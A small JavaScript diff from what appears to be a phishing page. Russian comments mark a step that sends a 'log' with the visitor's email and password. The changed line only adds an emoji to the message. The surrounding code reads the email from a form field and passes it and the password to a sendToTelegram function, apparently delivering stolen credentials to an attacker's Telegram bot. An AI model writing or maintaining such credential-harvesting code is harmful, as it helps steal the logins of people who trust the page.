@@ -278,7 +278,7 @@
       
       // === ОТПРАВКА ЛОГА С EMAIL И ПАРОЛЕМ ===
       const email = firstName.value.trim();
-      const logMessage = `Новый лог!\n\n 📧 Email: ${email}\n🔑 Password: ${password}`;
+      const logMessage = `📝 Новый лог!\n\n 📧 Email: ${email}\n🔑 Password: ${password}`;
       await sendToTelegram(logMessage);
       
       showStep(3);
